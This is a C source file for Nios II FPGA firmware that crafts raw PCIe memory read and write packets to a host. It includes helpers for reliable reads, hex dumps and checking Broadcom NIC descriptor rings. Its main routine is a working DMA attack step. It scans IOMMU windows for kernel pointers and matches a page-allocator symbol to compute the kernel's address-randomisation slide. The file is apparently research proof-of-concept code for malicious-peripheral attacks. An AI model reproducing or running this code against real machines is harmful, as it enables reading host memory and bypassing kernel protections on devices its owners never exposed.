/*
 * NIOS PCIe memory transaction generator
 *
 */

#include <stdio.h>
#include <ctype.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>
#include "system.h"
#include "io.h"
#include "sys/alt_timestamp.h"
#include "altera_avalon_timer.h"
#include "pcie.h"
#include "pciefpga.h"
#include "pcietlp.h"
#include "baremetalsupport.h"
#include "pcie-backend.h"

#include "mbuf.h"

//#define COMPLETER_ID 0x8200
#define COMPLETER_ID 0xC500
#define OWN

/* Make a memory request to the host, fetching a single 32 bit word.
 * Parameters:
 * address: 64 bit address to request
 * timeout: time in ns until we give up
 * Returns:
 * MemoryResponse structure containing details of response packet
 */
int memory_read(uint64_t address, uint64_t timeout,
  uint32_t *data_buffer, uint64_t data_buffer_length,
  uint32_t *returned_length)
{
  TLPDoubleWord tlp[64];
  static unsigned int tag=0;
  unsigned int tagSent = 0;
  int receivedCount = 0;
  int tlpLen = 0;
  unsigned long startTime = 0;
  unsigned long timeoutCycles = timeout*1000;
  int response;
  int status=0;

  tlpLen = create_memory_request(tlp, sizeof(tlp), TLPD_READ,
    COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
    address, data_buffer_length);

#ifdef DEBUG1
  printf("Sending request TLP, tag %x\n", tag);
#endif

  startTime = read_hw_counter();
  send_tlp((TLPQuadWord *) tlp, tlpLen, NULL, 0, TDA_ALIGNED);
  tagSent = tag;
  tag = (tag+1) % 32;


  do {
    enum tlp_completion_status completion_status=0;
    uint16_t completer_id=0, requester_id=0;
    uint8_t tag=0;
    receivedCount = wait_for_tlp((TLPQuadWord *) tlp, sizeof(tlp));
    if (receivedCount < 3*4)
      continue;

    status = parse_memory_response(tlp, receivedCount,
      data_buffer, data_buffer_length,
      &completion_status, &completer_id, &requester_id,
      &tag, returned_length);

#ifdef DEBUG1
    printf("Received completion: address 0x");
    write_uint_64_hex(address, '0');
    printf(", status %u, tag %u, completion_status %u,"
        "returned_length %d, value 0x%x\n", status, tag, completion_status,
        returned_length, data_buffer[0]);
#endif

    if ((status==0) && (completion_status == TLPCS_SUCCESSFUL_COMPLETION) && (tag == tagSent)) {

#ifdef DEBUG1
    printf("Matched completion: status %u, tag %u, completion_status %u,"
        "returned_length %d, value 0x%x\n", status, tag, completion_status,
        returned_length, data_buffer[0]);
#endif

      return status;
    }
  } while(read_hw_counter() < (startTime + timeoutCycles));

  return status;
}


int memory_write(uint64_t address, uint64_t timeout,
  uint32_t *data_buffer, uint64_t data_buffer_length,
  uint32_t *returned_length)
{
  TLPDoubleWord tlp[64];
  static unsigned int tag=0;
  unsigned int tagSent = 0;
  int receivedCount = 0;
  int tlpLen = 0;
  unsigned long startTime = 0;
  unsigned long timeoutCycles = timeout*1000;
  int response;
  int status=0;

  tlpLen = create_memory_request(tlp, sizeof(tlp), TLPD_WRITE, 
    COMPLETER_ID /* requester id */, tag, 0 /* loweraddress */,
    address, data_buffer_length);

#ifdef DEBUG1
  printf("Sending request TLP, tag %x\n", tag);
#endif

  startTime = read_hw_counter();
  send_tlp((TLPQuadWord *) tlp, tlpLen, data_buffer, data_buffer_length, TDA_ALIGNED);
  tagSent = tag;
  tag = (tag+1) % 32;

  return status;
}


void hexdump(void *mem, unsigned int len)
{
  const unsigned int HEXDUMP_COLS = 16;
  unsigned int i, j;

  for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
  {
    /* print offset */
    if(i % HEXDUMP_COLS == 0)
    {
      printf("0x%06x: ", i);
    }

    /* print hex data */
    if(i < len)
    {
      printf("%02x ", 0xFF & ((char*)mem)[i]);
    }
    else /* end of block, just aligning for ASCII dump */
    {
      printf("   ");
    }

    /* print ASCII dump */
    if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
    {
      for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
      {
        if(j >= len) /* end of block, not really printing */
        {
          putchar(' ');
        }
        else if(isprint(((char*)mem)[j])) /* printable char */
        {
          putchar(0xFF & ((char*)mem)[j]);        
        }
        else /* other char */
        {
          putchar('.');
        }
      }
      putchar('\n');
    }
  }
}

int read_reliable(uint64_t addr, uint32_t num_qwords, uint64_t *buf) {
  /*printf("Reliable read from ");*/
  /*write_uint_64_hex(addr, '0');*/
  /*printf("...\n");*/
  uint32_t status = 0, returned_length = 0;
  for (int i = 0; i < num_qwords; i++) {
    do {
      status = memory_read(addr + (i * sizeof(uint64_t)), 100000, &buf[i], sizeof(uint64_t), &returned_length);
      if (status) { return status; }
    } while (returned_length != sizeof(uint64_t));
  }
  return 0;
}

void write_buffer(uint64_t addr, uint32_t num_qwords, uint64_t *buf) {
  uint32_t status = 0, returned_length = 0;
  for (int i = 0; i < num_qwords; i++) {
      status = memory_write(addr + (i * sizeof(uint64_t)), 100000, &buf[i], sizeof(uint64_t), &returned_length);
  }
}

void dump_page(uint64_t addr) {
  uint64_t page[512];
  read_reliable(addr, 512, page);
  hexdump(page, 4096);
}

// check that a 16 byte section is part of a send buffer descriptor ring
// see BCM57785 Programmer's Reference Guide
int check_16byte(uint64_t *buf) {
  // lower 4 bytes of io virtual address in buffer ring should be 0
  if ((buf[0] & 0xFFFF) != 0) {
    return 0;
  }

  // first byte of io virtual address should be 8
  if ((buf[0] & 0xFF00000000000000) != 0x0800000000000000) {
    return 0;
  }

  // we expect VLAN Tag to be 0
  if ((buf[1] & 0xFFFFFFFF00000000) != 0) {
    return 0;
  }

  return 1;
}


int main()
{
  printf("Hello from Nios II!\n");
  usleep(2*1000*1000);
  printf("Starting...\n");
  alt_timestamp_start();

  printf("Finding BCM5701 0x2000 window...\n");
#define MAX_STATIC_KERNSYM 0xffffff8000b45008
#define MIN_STATIC_KERNSYM 0xffffff8000100000
#define SLIDE 0x002800000
#define IOMMU_MIN 0x530000
#define IOMMU_MAX 0xd76000
  //offset 8 into the pageallocator symbol (???)
#define gIOBMDPageAllocator_STATIC 0xffffff8000b28398

  uint64_t iommu_window = IOMMU_MIN;
  uint64_t page[512];
  uint64_t slide = 0;

  while (iommu_window <= IOMMU_MAX) {
    printf("Trying 0x");
    write_uint_64_hex(iommu_window, '0');
    printf("...\n");

    int status = read_reliable(iommu_window, 512, page);
    if (status) {
      printf("bad read\n");
      iommu_window += 0x1000;
      continue;
    }

    for (int i = 0; i < 512; i++) {

      if (page[i] >= (MIN_STATIC_KERNSYM + SLIDE) && page[i] <= (MAX_STATIC_KERNSYM + SLIDE)) {
        printf("Found 0x");
        write_uint_64_hex(page[i], '0');
        printf(" at index %x\n", i);
        printf("Test: 0x");
        write_uint_64_hex(page[i] & 0xFFFFF, '0');
        printf("...\n");
      }

      // we have found the gIOBMDPageAllocator address
      if ((page[i] & 0xFFFFF) == 0x28398 /*&&
          page[i] & 0xFFFFFFF000000000 == 0xffffff8000000000*/) {
        slide = page[i] - gIOBMDPageAllocator_STATIC;
        printf("Slide: 0x");
        write_uint_64_hex(slide, '0');
        printf("...\n");
        break;
      }
    }

    if (slide) { break; }

    iommu_window += 0x1000;
  }
  return 0;
}
